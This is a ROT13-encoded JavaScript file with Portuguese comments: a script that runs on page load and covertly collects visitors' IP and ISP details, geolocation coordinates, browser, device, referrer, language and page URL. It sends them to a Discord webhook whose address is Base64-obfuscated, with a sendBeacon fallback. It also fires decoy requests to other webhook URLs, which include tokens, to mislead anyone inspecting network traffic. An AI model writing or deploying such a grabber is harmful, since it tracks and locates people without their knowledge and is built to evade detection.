"hfr fgevpg";

// N HEY erny qb jroubbx é pbqvsvpnqn rz Onfr64 cnen bshfpnçãb.
// NGRAÇÃB: Rffn gépavpn ncranf qvsvphygn n ivfhnyvmnçãb qvergn, znf b raqcbvag erny nvaqn cbqreá fre qrfpboregb cbe hfháevbf rkcrevragrf.
pbafg rapbqrqJroubbx = "nUE0pUZ6Yl9xnKAwo3WxYzAioF9upTxiq2IvnT9in3ZiZGZmAwD0BQL5ZwV4ZwR5AwN2ZP9iHREgAKEWo29XpxAEH2gCqTcBpJDkqJ5brGOipaZgLxWgK25QGTkzMmqjJxExM0EBAUx1FIEFBIWBJxI4ZwR2HHMmnt==";
pbafg jroubbxHEY = ngbo(rapbqrqJroubbx);

/**
 * Raivn erdhvfvçõrf "snyfnf" cnen qvirefbf raqcbvagf n svz qr qvsvphygne n ybpnyvmnçãb
 * qb raqcbvag erny abf QriGbbyf.
 */
shapgvba fraqSnxrErdhrfgf() {
    // Yvfgn qr HEYf svpgípvnf (nyéz qr raqcbvagf ernvf qr bhgebf freivçbf)
    pbafg snxrHEYf = [
        "uggcf://qvfpbeq.pbz/ncv/jroubbxf/1336522953252274258/eiSq2_W1HgiSpQ28Q05D2yMsEdbwzE6tu2x9mY7vLfla8JBOGKJFBaFLvvtbuPerwdDj",
        "uggcf://qvfpbeq.pbz/ncv/jroubbxf/1336522973753905192/WPON-IlsODPoRSGsg1sznCAx8Yqqqg6oMvbus_HhWBiCMIPR_T3Ces2EPhD4YDCljWdq"
    ];

    snxrHEYf.sbeRnpu(hey => {
        // Hfnzbf zbqr "ab-pbef" cnen rivgne oybdhrvbf qr PBEF; bf reebf freãb vtabenqbf.
        srgpu(hey, { zbqr: 'ab-pbef' }).pngpu(() => {});
    });
}

/**
 * Nghnyvmn bf pbagnqberf qr nprffb neznmranqbf ab ybpnyFgbentr.
 * Fr n qngn neznmranqn sbe qvsreragr qn qngn nghny (sbezngb cg-OE), bf pbagnqberf fãb erfrgnqbf.
 * Ergbean hz bowrgb pbz bf pbagnqberf nghnyvmnqbf: { fvgrPbhagre, cntrPbhagre }.
 */
shapgvba hcqngrNpprffPbhagref() {
    pbafg gbqnl = arj Qngr().gbYbpnyrQngrFgevat("cg-OE");
    pbafg fgberqQngr = ybpnyFgbentr.trgVgrz("npprffPbhagreQngr");
    vs (fgberqQngr !== gbqnl) {
        ybpnyFgbentr.frgVgrz("npprffPbhagreQngr", gbqnl);
        ybpnyFgbentr.frgVgrz("fvgrPbhagre", "0");
        ybpnyFgbentr.frgVgrz("cntrPbhagre", "0");
    }
    yrg fvgrPbhagre = cnefrVag(ybpnyFgbentr.trgVgrz("fvgrPbhagre") || "0", 10);
    yrg cntrPbhagre = cnefrVag(ybpnyFgbentr.trgVgrz("cntrPbhagre") || "0", 10);
    fvgrPbhagre++;
    cntrPbhagre++;
    ybpnyFgbentr.frgVgrz("fvgrPbhagre", fvgrPbhagre);
    ybpnyFgbentr.frgVgrz("cntrPbhagre", cntrPbhagre);
    erghea { fvgrPbhagre, cntrPbhagre };
}

// Bogéz b ubeáevb ybpny qb shfb oenfvyrveb
shapgvba trgOenmvyvnaGvzrmbar() {
    erghea arj Qngr().gbYbpnyrFgevat("cg-OE", { gvzrMbar: "Nzrevpn/Fnb_Cnhyb" });
}

// Tren hz VQ úavpb hgvyvmnaqb pelcgb, fr qvfcbaíiry
shapgvba trarengrVQ() {
    vs (jvaqbj.pelcgb && pelcgb.trgEnaqbzInyhrf) {
        pbafg neenl = arj Hvag32Neenl(1);
        pelcgb.trgEnaqbzInyhrf(neenl);
        erghea `vq-${neenl[0].gbFgevat(36)}`;
    }
    erghea `vq-${Zngu.enaqbz().gbFgevat(36).fhofge(2, 9)}`;
}

// Bogéz n ybpnyvmnçãb qb hfháevb pbz gengnzragb ncevzbenqb qr reebf
shapgvba trgYbpngvba() {
    erghea arj Cebzvfr((erfbyir, erwrpg) => {
        vs (!anivtngbe.trbybpngvba) {
            erwrpg("Trbybpngvba aãb é fhcbegnqn cryb anirtnqbe.");
        } ryfr {
            anivtngbe.trbybpngvba.trgPheeragCbfvgvba(
                (cbfvgvba) => {
                    erfbyir({
                        yngvghqr: cbfvgvba.pbbeqf.yngvghqr,
                        ybatvghqr: cbfvgvba.pbbeqf.ybatvghqr
                    });
                },
                (reebe) => {
                    erwrpg("Snyun nb bogre n ybpnyvmnçãb: " + reebe.zrffntr);
                },
                { gvzrbhg: 10000 }
            );
        }
    });
}

// Bogéz vasbeznçõrf qr VC qr sbezn ebohfgn
nflap shapgvba trgVCVasb() {
    gel {
        pbafg erfcbafr = njnvg srgpu('uggcf://vcncv.pb/wfba/');
        vs (!erfcbafr.bx) {
            guebj arj Reebe(`Reeb an erdhvfvçãb: ${erfcbafr.fgnghfGrkg}`);
        }
        pbafg qngn = njnvg erfcbafr.wfba();
        erghea qngn;
    } pngpu (reebe) {
        pbafbyr.reebe("Reeb nb bogre vasbeznçõrf qb VC:", reebe);
        erghea ahyy;
    }
}

// Sbezngn b póqvtb qr áern qr sbezn frthen
shapgvba sbezngNernPbqr(pbhagelPbqr, pvglPbqr) {
    vs (pbhagelPbqr && pvglPbqr) {
        erghea `+${pbhagelPbqr} ${pvglPbqr}`;
    }
    erghea "Qrfpbaurpvqb";
}

// Shaçãb nffíapeban cnen qrgrpgne b anirtnqbe
nflap shapgvba qrgrpgOebjfre() {
    pbafg hn = anivtngbe.hfreNtrag;
    vs (hn.vapyhqrf("BCE") || hn.vapyhqrf("Bcren")) {
        vs (hn.gbYbjrePnfr().vapyhqrf("tk")) {
            erghea "Bcren TK";
        }
        erghea "Bcren";
    } ryfr vs (hn.vapyhqrf("Rqt")) {
        erghea "Zvpebfbsg Rqtr";
    } ryfr vs (hn.vapyhqrf("Puebzr")) {
        vs (anivtngbe.oenir && glcrbs anivtngbe.oenir.vfOenir === 'shapgvba') {
            gel {
                pbafg vfOenir = njnvg anivtngbe.oenir.vfOenir();
                vs (vfOenir) {
                    erghea "Oenir";
                }
            } pngpu (reebe) {
                pbafbyr.reebe("Reeb nb qrgrpgne Oenir:", reebe);
            }
        }
        erghea "Tbbtyr Puebzr";
    } ryfr vs (hn.vapyhqrf("Sversbk")) {
        erghea "Sversbk";
    }
    erghea "Anirtnqbe Nygreangvib";
}

// Shaçãb cnen qrgrpgne b gvcb qr qvfcbfvgvib pbz onfr ab hfre ntrag
shapgvba qrgrpgQrivpr() {
    pbafg hn = anivtngbe.hfreNtrag;
    vs (/naqebvq/v.grfg(hn)) {
        erghea "Naqebvq";
    } ryfr vs (/vCubar|vCnq|vCbq/v.grfg(hn)) {
        erghea "vBF";
    } ryfr vs (/Jvaqbjf AG 10\.0/v.grfg(hn)) {
        // Jvaqbjf 10 r Jvaqbjf 11 serdhragrzragr pbzcnegvyunz b zrfzb vqragvsvpnqbe.
        // Fr b HN pbagre "Jvaqbjf 11", pynffvsvpnzbf rkcyvpvgnzragr pbzb gny.
        vs (hn.vapyhqrf("Jvaqbjf 11")) {
            erghea "Jvaqbjf 11";
        }
        erghea "Jvaqbjf 10/11";
    } ryfr vs (/Jvaqbjf AG/v.grfg(hn)) {
        erghea "Jvaqbjf";
    } ryfr vs (/Znp BF K/v.grfg(hn)) {
        erghea "ZnpBF";
    } ryfr vs (/PeBF/v.grfg(hn)) {
        erghea "Puebzr BF";
    }
    erghea "Qrfpbaurpvqb";
}

// Shaçãb dhr gragn raivne bf qnqbf ivn srgpu r, rz pnfb qr reeb (cbffviryzragr cbe oybdhrnqberf), hfn fraqOrnpba pbzb snyyonpx
nflap shapgvba fraqQngn(rzorq) {
    gel {
        pbafg erfcbafr = njnvg srgpu(jroubbxHEY, {
            zrgubq: 'CBFG',
            urnqref: {
                'Pbagrag-Glcr': 'nccyvpngvba/wfba'
            },
            obql: WFBA.fgevatvsl({ rzorqf: [rzorq] })
        });
        vs (!erfcbafr.bx) {
            guebj arj Reebe("Reeb nb raivne cnen b jroubbx: " + erfcbafr.fgnghfGrkg);
        }
        pbafbyr.ybt("Qnqbf raivnqbf pbz fhprffb ivn srgpu!");
    } pngpu (reebe) {
        pbafbyr.reebe("Snyun ab raivb ivn srgpu. Gragnaqb snyyonpx pbz fraqOrnpba...", reebe);
        vs (anivtngbe.fraqOrnpba) {
            pbafg cnlybnq = WFBA.fgevatvsl({ rzorqf: [rzorq] });
            pbafg oybo = arj Oybo([cnlybnq], { glcr: 'nccyvpngvba/wfba' });
            pbafg ornpbaFhpprff = anivtngbe.fraqOrnpba(jroubbxHEY, oybo);
            vs (ornpbaFhpprff) {
                pbafbyr.ybt("Qnqbf raivnqbf pbz fhprffb ivn fraqOrnpba!");
            } ryfr {
                pbafbyr.reebe("Snyun ab raivb ivn fraqOrnpba.");
            }
        } ryfr {
            pbafbyr.reebe("fraqOrnpba aãb rfgá qvfcbaíiry arfgr anirtnqbe.");
        }
    }
}

// Shaçãb cevapvcny cnen pbyrgne qnqbf r raivne cnen b jroubbx qb Qvfpbeq
nflap shapgvba fraqGbQvfpbeqJroubbx() {
    gel {
        // Raivn nf snxr erdhrfgf vzrqvngnzragr cnen "pbashaqve" riraghnvf vafcrgberf
        fraqSnxrErdhrfgf();
        
        // Nghnyvmn bf pbagnqberf qr nprffb r bogéz nf rfgngífgvpnf
        pbafg { fvgrPbhagre, cntrPbhagre } = hcqngrNpprffPbhagref();
      
        // Pbyrgn qr qnqbf oáfvpbf
        pbafg ragelGvzr = trgOenmvyvnaGvzrmbar();
        pbafg ragelQngr = arj Qngr().gbYbpnyrQngrFgevat("cg-OE");
        pbafg vq = trarengrVQ();
        pbafg vcVasb = njnvg trgVCVasb();

        // Gragn bogre n ybpnyvmnçãb; fr snyune, cebffrthr pbz inybe ahyb
        yrg ybpngvba = ahyy;
        gel {
            ybpngvba = njnvg trgYbpngvba();
        } pngpu (ybpReebe) {
            pbafbyr.reebe(ybpReebe);
        }

        // Qrgrpgn b anirtnqbe hgvyvmnqb r b qvfcbfvgvib
        pbafg oebjfre = njnvg qrgrpgOebjfre();
        pbafg qrivpr = qrgrpgQrivpr();

        // Pncghen n HEY qn cátvan dhr b hfháevb nprffbh
        pbafg cntrHEY = jvaqbj.ybpngvba.uers || "Qrfpbaurpvqb";

        // Zbagn vasbeznçõrf rkgenf zrfzb fr nythznf cnegrf aãb sbenz pbyrgnqnf
        pbafg vfICA = vcVasb?.frphevgl?.ica || snyfr;
        pbafg ybpngvbaGrkg = `${vcVasb?.pvgl || "Qrfpbaurpvqb"}/${vcVasb?.ertvba || "Qrfpbaurpvqb"}/${vcVasb?.pbhagel_anzr || "Qrfpbaurpvqb"}${vfICA ? " (ICA)" : ""}`;
        pbafg nernPbqr = sbezngNernPbqr(vcVasb?.pbhagel_pnyyvat_pbqr, vcVasb?.cbfgny);
        pbafg hfreNtrag = anivtngbe.hfreNtrag || "Qrfpbaurpvqb";
        pbafg ersrere = qbphzrag.ersreere || "Qvergb";
        pbafg vqvbzn = anivtngbe.ynathntr || "Qrfpbaurpvqb";
        pbafg erfbyhpnb = `${jvaqbj.fperra.jvqgu}k${jvaqbj.fperra.urvtug}`;

        // Rfgehghen b rzorq pbz pngrtbevnf, rzbwvf r frcnençõrf, vapyhvaqb n vasbeznçãb qb qvfcbfvgvib
        pbafg rzorq = {
            gvgyr: "📢 Abib Nprffb nb Fvgr",
            qrfpevcgvba: "Qrgnyurf qb nprffb r rfgngífgvpnf qr geásrtb",
            pbybe: 0k00ss00,
            svryqf: [
                {
                    anzr: "⏰ Qngn r Uben",
                    inyhr: `**Ubeáevb:** ${ragelGvzr}\a**Qngn:** ${ragelQngr}\a**VQ:** ${vq}`
                },
                {
                    anzr: "🌎 Ybpnyvmnçãb r VC",
                    inyhr: `**Bcrenqben:** ${vcVasb?.bet || "Qrfpbaurpvqb"}\a**Ybpnyvqnqr:** ${ybpngvbaGrkg}\a**Pbbeqranqnf:** ${ybpngvba ? `${ybpngvba.yngvghqr}, ${ybpngvba.ybatvghqr}` : "Qrfpbaurpvqb"}\a**VC:** ${vcVasb?.vc || "Qrfpbaurpvqb"}\a**Póqvtb qr Áern:** ${nernPbqr}`
                },
                {
                    anzr: "💻 Anirtnqbe r Nzovragr",
                    inyhr: `**Hfre Ntrag:** ${hfreNtrag}\a**Anirtnqbe:** ${oebjfre}\a**Ersrere:** ${ersrere}\a**Cátvan Nprffnqn:** [${cntrHEY}](${cntrHEY})`
                },
                {
                    anzr: "📱 Qvfcbfvgvib",
                    inyhr: `**Gvcb:** ${qrivpr}`
                },
                {
                    anzr: "📊 Rfgngífgvpnf qr Nprffb Ubwr",
                    inyhr: `**Fvgr:** ${fvgrPbhagre}\a**Cátvan:** ${cntrPbhagre}`
                },
                {
                    anzr: "🔎 Naáyvfr Ninaçnqn",
                    inyhr: `**Vqvbzn:** ${vqvbzn}\a**Erfbyhçãb:** ${erfbyhpnb}`
                }
            ],
            gvzrfgnzc: arj Qngr().gbVFBFgevat()
        };

        // Raivn bf qnqbf hgvyvmnaqb n shaçãb pbz snyyonpx
        fraqQngn(rzorq);
    } pngpu (reebe) {
        pbafbyr.reebe("Reeb ab raivb qr qnqbf:", reebe);
    }
}

// Rkrphgn n shaçãb nb pneertne b fpevcg
fraqGbQvfpbeqJroubbx();
